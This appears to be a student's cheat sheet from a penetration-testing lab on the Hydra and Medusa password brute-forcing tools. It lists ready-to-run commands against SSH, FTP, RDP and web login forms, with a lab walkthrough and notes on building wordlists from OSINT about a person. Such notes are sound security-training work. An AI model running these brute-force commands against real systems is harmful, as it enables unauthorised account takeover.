# Hydra
- Crafting the correct params string is crucial for a successful Hydra attack. Accurate information about the form's structure and behavior is essential for constructing this string effectively. 

- Can brute force FTP, SSH, HTTP, SMTP, POP3, IMAP, MYSQL, MSSQL, VNC, RDP:
- HTTP: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
- Single SSH: `hydra -l satwossh -P 2023-200_most_used_passwords.txt 94.237.52.228 -s 56874 ssh -I`
- Multiple SSH servers: `hydra -l root -p toor -M targets.txt ssh`
- FTP on non-standard port: `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
- Web Login Form: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
- RDP Brute-forcing: `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

- Look at the HTML of the login form for details


- The `POST` method indicates that data is being sent to the server to create or update a resource.
- `/login` is the URL endpoint handling the login request.
- The `Content-Type` header specifies how the data is encoded in the request body.
- The `Content-Length` header indicates the size of the data being sent.
- The request body contains the username and password, encoded as key-value pairs.
- Hydra's `http-post-form` service is specifically designed to target login forms: `hydra [options] target http-post-form "path:params:condition_string"`
- You can specify what success or failure is:
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"`
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"`

- Form Parameters: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (^USER^ and ^PASS^) within these parameters with values from your wordlists.
- Additional Fields: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the params string. These can have static values or dynamic placeholders if their values change with each request.
- Success Condition: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).

- The form submits data to the root path (`/`).
  - The username field is named `username`.
  - The password field is named `password`.
 
Therefore, the `params` string would be:
- `/:username=^USER^&password=^PASS^:F=Invalid credentials`
  - `"/"`: The path where the form is submitted.
  -  `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
  -  `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
 
Resulting in - `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`

Flow -
- brute force gttp
- `hydra -L username-anarchy/TM.txt -P passwords.txt -s 21 -V localhost ftp`

# [Medusa]([url](https://docs.medusajs.com/learn/fundamentals/modules))
- `man medusa`
- Modules (-M) are case sensitive, both the flag (M) and the modules you call. `HTTP` will fail but `http` wont etc.
- Whether the flag is capitlized or not will mean different things

- `medusa [target_options] [credential_options] -M module [module_options]`
- Useful for FTP, HTTP, IMAP, MYSQL, POP3, RDP, SSHV2, SUBVERSION(SVN), TELNET, VNX, Web Form.
- SSH Server: `medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh`
- Multiple HTTP Auth: `medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET `
- test for empty or default passwords (where user = password: `medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name`

- Reminder SSH Login: `ssh sshuser@<IP> -p PORT`

- Find SSH access --> run `nmap localhost` --> run new medusa command on FTP port found: `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5` --> Found ftpuser password then run `ftp <IP>` --> enter user --> enter password -->> find file --> `get filename1` --> now in SSH shell

- Make a custom wordlist with `Username Anarchy`
  - `/username-anarchy Jane Smith > jane_smith_usernames.txt`
  - txt file created will have a bunch of username variations based off `Jane Smith`
 
- Make custom password lists with `CUPP`:
  - CUPP will take your inputs and create a comprehensive list of potential passwords
  - OSINT will be a goldmine of information for CUPP
  - Spawn CUPP with `cupp -i` and follow the prompts
 
Basic http: `medusa -h 83.136.252.13 -n 38252 -U top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -M http`

| Option | Description | Example |
|--------|-------------|---------|
| `-h HOST` | Target host (IP or hostname) | `medusa -h 192.168.1.100 ...` |
| `-H FILE` | File containing target hosts | `medusa -H hosts.txt ...` |
| `-u USER` | Username to test | `medusa -u admin ...` |
| `-U FILE` | File containing usernames | `medusa -U users.txt ...` |
| `-p PASS` | Password to test | `medusa -p password123 ...` |
| `-P FILE` | File containing passwords | `medusa -P passwords.txt ...` |
| `-C FILE` | File containing username:password combinations | `medusa -C combos.txt ...` |
| `-O FILE` | Write found logins to file | `medusa -O found_logins.txt ...` |
| `-t THREADS` | Number of threads (default: 8) | `medusa -t 16 ...` |
| `-T SECONDS` | Total timeout in seconds | `medusa -T 300 ...` |
| `-f` | Stop after first successful login per host | `medusa -f ...` |
| `-F` | Stop after first successful login (global) | `medusa -F ...` |
| `-v` | Verbose mode | `medusa -v ...` |
| `-d` | Display list of available modules | `medusa -d` |
| `-n PORT` | Use non-default port | `medusa -n 2222 ...` |
| `-s` | Enable SSL | `medusa -s ...` |
| `-m` | Module-specific parameters | `medusa -m DIR:/admin ...` |


